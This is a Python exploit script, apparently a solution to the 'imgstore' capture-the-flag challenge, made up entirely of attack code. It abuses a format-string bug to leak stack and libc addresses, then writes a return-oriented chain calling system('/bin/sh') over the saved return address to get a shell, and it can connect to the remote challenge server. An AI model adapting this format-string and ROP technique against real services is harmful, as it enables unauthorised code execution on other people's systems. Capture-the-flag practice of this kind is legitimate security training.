#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

exe = ptr.ELF("./imgstore_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")
pwn.context.binary = pwn.ELF(exe.filepath, checksec=False)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "imgstore.chal.imaginaryctf.org:1337"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # stack base leak
    io.sendlineafter(">> ", "3")
    io.sendlineafter("Enter book title: ", "#%57$lx#")
    io.recvuntil("#")
    stack_base = int(io.recvuntil("#").strip(b"#"), 16) - 0x20D89
    ptr.logger.info(f"stack_base: {hex(stack_base)}")
    io.sendlineafter("Still interested in selling your book? [y/n]: ", "y")

    # libc base leak
    io.sendlineafter("Enter book title: ", "#%11$lx#")
    io.recvuntil("#")
    libc.base = int(io.recvuntil("#").strip(b"#"), 16) - 0x1ED6A0
    io.sendlineafter("Still interested in selling your book? [y/n]: ", "y")

    # write rop chain
    rop = b""
    rop += ptr.p64(next(libc.gadget("ret;")))
    rop += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    rop += ptr.p64(next(libc.find("/bin/sh\x00")))
    rop += ptr.p64(unwrap(libc.symbol("system")))

    ret_addr = stack_base + 0x208A8

    for i in range(len(rop)):
        payload = pwn.fmtstr_payload(8, {ret_addr + i: rop[i]})
        io.sendlineafter("Enter book title: ", payload)
        if i == len(rop) - 1:
            io.sendlineafter("Still interested in selling your book? [y/n]: ", "n")
        else:
            io.sendlineafter("Still interested in selling your book? [y/n]: ", "y")
        continue

    io.sendline("echo pwn")
    io.recvlineafter("pwn")
    io.sh()
    return


if __name__ == "__main__":
    main()
